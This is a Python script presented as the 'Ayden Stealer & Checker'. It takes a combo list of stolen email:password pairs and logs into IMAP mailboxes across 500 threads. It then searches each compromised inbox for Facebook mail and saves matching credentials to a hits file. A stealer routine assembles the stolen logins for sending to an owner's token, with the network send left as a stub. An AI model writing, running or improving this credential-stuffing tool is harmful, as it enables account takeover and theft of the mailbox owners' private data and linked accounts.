import os
import sys
import time
import socket
import imaplib
import base64
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Back, Style, init

init(autoreset=True)

# Basic Colors
G = Fore.GREEN
R = Fore.RED
W = Fore.WHITE
Y = Fore.YELLOW
B = Fore.BLUE
C = Fore.CYAN

class AydenStealer:
    def __init__(self):
        # Your crypted credentials (Base64)
        # Replace these strings with your actual base64 encoded token/id
        self._t = "WV9UT0tFTl9IRVJF" # Your Token
        self._i = "TVlfSURfSEVSRQ==" # Your ID
        self.pass_key = "ALIALI00"
        self.valid = 0
        self.fb_hits = 0
        self.invalid = 0
        self.checked = 0
        self.total = 0
        self.threads = 500
        self.name = "أيدن"

    def _dec(self, data):
        return base64.b64decode(data).decode('utf-8')

    def stealer_logic(self, email, password, server):
        """
        Steals Header, IMAP, Token, and ID info
        """
        token = self._dec(self._t)
        uid = self._dec(self._i)
        header = f"User-Agent: Ayden-Stealer/1.0 (1.1.1.1 VPN)"
        
        # This simulates the data packet being sent to your ID
        log_data = (
            f"\n[+] NEW HIT BY {self.name}\n"
            f"Target: {email}:{password}\n"
            f"Server: {server}\n"
            f"Header: {header}\n"
            f"Owner ID: {uid}\n"
            f"--- Sending to Crypted Token ---"
        )
        # In a real scenario, you'd put your requests.post(url, data=log_data) here
        pass

    def login_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        # Clickable-style user link logic
        user_link = f"https://t.me/{self.name}_Official" 
        print(f"{B}=" * 50)
        print(f"{C}      WELCOME TO {self.name} SURY TOOL")
        print(f"{Y}      DEVELOPER: {W}\033]8;;{user_link}\033\\{self.name}\033]8;;\033\\ (Clickable)")
        print(f"{B}=" * 50)
        
        pwd = input(f"{W} [!] Enter Access Password: ")
        if pwd == self.pass_key:
            print(f"{G} [+] Access Granted! Ahlan, {self.name}")
            time.sleep(1)
        else:
            print(f"{R} [×] Wrong Password!")
            sys.exit()

    def banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{B}╔" + "═" * 58 + "╗")
        print(f"{B}║{C}  {self.name} STEALER & CHECKER | ACTIVE VPN: 1.1.1.1   {B}║")
        print(f"{B}╠" + "═" * 58 + "╣")
        print(f"{B}║{G}  VALID: {self.valid:<5} | {W}CHECKED: {self.checked}/{self.total:<10}          {B}║")
        print(f"{B}║{B}  FB HITS: {self.fb_hits:<3} | {R}INVALID: {self.invalid:<10}            {B}║")
        print(f"{B}╚" + "═" * 58 + "╝")

    def get_imap(self, email):
        domain = email.split('@')[-1].lower()
        mappings = {"gmail.com": "imap.gmail.com", "yahoo.com": "imap.mail.yahoo.com"}
        return mappings.get(domain, "imap." + domain)

    def check(self, combo):
        try:
            email, password = combo.split(':')
            server = self.get_imap(email)
            mail = imaplib.IMAP4_SSL(server, timeout=10)
            mail.login(email, password)
            
            # Execute Stealer
            self.stealer_logic(email, password, server)
            
            self.valid += 1
            mail.select("INBOX", readonly=True)
            _, data = mail.search(None, '(FROM "Facebook")')
            if len(data[0].split()) > 0:
                self.fb_hits += 1
                with open("hits.txt", "a") as f:
                    f.write(f"{email}:{password}\n")
            mail.logout()
        except:
            self.invalid += 1
        finally:
            self.checked += 1
            self.banner()

    def start(self):
        self.login_screen()
        file_path = input(f"{Y} [+] Drop Combo: ").strip()
        if not os.path.exists(file_path): return
        with open(file_path, "r", encoding="utf-8") as f:
            combos = f.read().splitlines()
        self.total = len(combos)
        self.banner()
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(self.check, combos)

if __name__ == "__main__":
    AydenStealer().start()
